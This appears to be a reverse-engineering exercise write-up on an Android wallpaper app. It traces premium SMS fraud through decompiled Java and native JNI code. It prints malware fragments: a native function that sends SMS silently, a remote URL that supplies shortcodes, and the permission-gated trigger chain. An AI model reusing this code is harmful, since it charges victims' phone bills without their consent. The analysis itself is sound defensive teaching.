# Exercise 6 - Find and Reverse the Native Function

## Goals:

The goal of this exercise is to put all of our Android reversing skills together to analyze an app as a whole: its DEX and native code.

## Context

You are a malware analyst for Android applications. You are concerned that this sample maybe doing premium SMS fraud, meaning that it sends an SMS to a premium phone number without disclosure & user consent. In order to flag as malware, you need to determine if the Android application is:

- [x] Sending an SMS message, and
- [x] That SMS message is going to a premium number, and
- [x] If there is an obvious disclosure, and
- [x] If the SMS message is only sent to the premium number after user consent.

## Instructions

- [x] Go on and reverse!

### Entrypoints

#### Launcher

```xml
<activity android:theme="@style/ActionBarTheme" android:label="@string/app_name" android:name="com.mbv.a.wp.TabWallPaperListActivity" android:configChanges="keyboardHidden|orientation|screenSize">
    <intent-filter>
        <action android:name="android.intent.action.MAIN"/>
        <category android:name="android.intent.category.LAUNCHER"/>
    </intent-filter>
</activity>
```

#### Exports

```xml
<activity android:name="com.facebook.CustomTabActivity" android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data android:scheme="@string/fb_login_protocol_scheme"/>
    </intent-filter>
</activity>

<receiver android:name="com.mbv.a.sdklibrary.receiver.ReReceiver" android:exported="true">
    <intent-filter>
        <action android:name="com.android.vending.INSTALL_REFERRER"/>
    </intent-filter>
</receiver>

<receiver android:name="com.mbv.a.sdklibrary.receiver.Alarmreceiver" android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.BOOT_COMPLETED"/>
        <action android:name="com.mbv.a.restart_action"/>
    </intent-filter>
</receiver>

<service android:name="com.mbv.a.sdklibrary.service.SdkService" android:enabled="true">
    <intent-filter android:priority="1000">
        <action android:name="com.mbv.a.servicce"/>
    </intent-filter>
</service>
```

### Analysis

The launcher does some funky stuff if it has `SEND_SMS` permissions.

```java
// mbv/a/wp/TabWallPaperListActivity
public void onCreate(Bundle bundle) {
    /* lines omitted for clarity */
    b();
    if (j.a(this, "android.permission.SEND_SMS")) {
        a.c();
    } else if (Build.VERSION.SDK_INT >= 23) {
        requestPermissions(new String[]{"android.permission.SEND_SMS"}, 0);
    }
    a.a((Activity) this);
}
```

The `b` function does some funky stuff with an HTTP get. Specifically, the first argument of `JniManager.nativeApktype()` should be returning a URL for the HTTP get and it is a native binary call, which seems sketchy. The `com/mbv/a/sdklibrary/manager/JniManager.java` file contains the code for this. That file performs `System.loadLibrary("oc_helper");`.

```java
private void b() {
    HashMap hashMap = new HashMap();
    hashMap.put("sc", "1860001");
    hashMap.put("kw", "01");

    AsyncHttpGet.get(JniManager.nativeApktype(), hashMap, new com.mbv.a.sdklibrary.net.b() {
        /* class com.mbv.a.wp.TabWallPaperListActivity.AnonymousClass4 */

        public void a(Exception exc, byte[] bArr) {
            if (exc == null && bArr != null) {
                String str = new String(bArr);
                if (!TextUtils.isEmpty(str)) {
                    try {
                        JSONObject jSONObject = new JSONObject(str);
                        if (jSONObject != null) {
                            Iterator<String> keys = jSONObject.keys();
                            ArrayList arrayList = new ArrayList();
                            while (keys.hasNext()) {
                                b bVar = new b();
                                String obj = keys.next().toString();
                                bVar.a(obj);
                                bVar.b(jSONObject.getString(obj));
                                arrayList.add(bVar);
                            }
                            com.mbv.a.wp.b.a.a().a(arrayList);
                            if (arrayList.size() > 0) {
                                TabWallPaperListActivity.this.runOnUiThread(new Runnable() {
                                    /* class com.mbv.a.wp.TabWallPaperListActivity.AnonymousClass4.AnonymousClass1 */

                                    public void run() {
                                        TabWallPaperListActivity.this.a();
                                    }
                                });
                            }
                        }
                    } catch (JSONException e) {
                        e.printStackTrace();
                    }
                }
            }
        }
    });
}
```

### Native binary analysis

Analysis of `nativeApktype` reveals that the function returns a URL of `http://m.news-adding.com/index/ApkType.

```C
void Java_com_mbv_a_sdklibrary_manager_JniManager_nativeApktype(JNIEnv *param_1)
{
  (*(*param_1)->NewStringUTF)((JNIEnv *)param_1,"http://m.news-adding.com/index/ApkType");
  return;
}
```

Additionally, the `nativesend` function invokes the Java sendTextMessage function from a native library:

```C
void Java_com_mbv_a_sdklibrary_manager_JniManager_nativesend
               (JNIEnv *param_1,undefined4 param_2,undefined4 param_3,undefined4 param_4)

{
  jclass clazz;
  jmethodID p_Var1;
  _jobject *p_Var2;
  
  clazz = (*(*param_1)->FindClass)((JNIEnv *)param_1,"android/telephony/SmsManager");
  if (clazz != (jclass)0x0) {
    p_Var1 = (*(*param_1)->GetStaticMethodID)
                       ((JNIEnv *)param_1,clazz,"getDefault","()Landroid/telephony/SmsManager;");
    p_Var2 = (_jobject *)
             CallStaticObjectMethod((_JNIEnv *)param_1,(_jclass *)clazz,(_jmethodID *)p_Var1);
    p_Var1 = (*(*param_1)->GetMethodID)
                       ((JNIEnv *)param_1,clazz,"sendTextMessage",
                                                
                        "(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/app/PendingIntent;Landroid/app/PendingIntent;)V"
                       );
    if (p_Var1 != (jmethodID)0x0) {
      CallVoidMethod((_JNIEnv *)param_1,p_Var2,(_jmethodID *)p_Var1,param_3,0,param_4,0,0);
    }
  }
  return;
}
```

### Continued Java analysis

So because `nativesend` is able to send a text message, we need to determine whether it is a Premium message and whether consent was given. Here is the only spot that `nativesend` is called.

```Java
// mbv/a/sdklibrary/manager/JniManager.java
public boolean a(String str, String str2) {
    if ((b.a().b(str + "_" + str2) != null && b.a().b(str + "_" + str2).equals("true")) || !this.f688a) {
        return true;
    }
    try {
        nativesend(str, str2);
        a.a().c();
        b.a().a(str + "_" + str2, "true");
    } catch (Exception e) {
        g.a(e.getMessage());
    }
    return false;
}
```

Searching for places where the JniManager function `a` is called, we find:

```
egrep -R "JniManager.*a\(" *
HDWallpaper/sources/com/mbv/a/sdklibrary/a/a/a.java:            if (JniManager.a().a(poll.getMt_shortcode(), poll.getMt_keyword())) {
HDWallpaper/sources/com/mbv/a/sdklibrary/a/a/a.java:        JniManager.a().b().postDelayed(new Runnable() {
HDWallpaper/sources/com/mbv/a/sdklibrary/manager/JniManager.java:    public static JniManager a() {
HDWallpaper/sources/com/mbv/a/sdklibrary/a.java:        JniManager.a().a(context);
HDWallpaper/sources/com/mbv/a/sdklibrary/a.java:        JniManager.a().c();
```

The first one of those is promising, and the code is shown below:

```Java
// mbv/a/sdklibrary/a/a/a.java
public void d() {
    if (this.b != null && this.b.size() > 0) {
        CodeData poll = this.b.poll();
        if (JniManager.a().a(poll.getMt_shortcode(), poll.getMt_keyword())) {
            a(200);
        } else {
            a(2000);
        }
    }
}
```

This is a clear case of a Premium message getting sent, but is it consentual? I believe the answer to be *no*. This function is called via a chain of function calls that appears to be initiated upon construction of the frame layout. There is a check for SMS permissions in the launcher to insure that the premium SMS fraud will work.
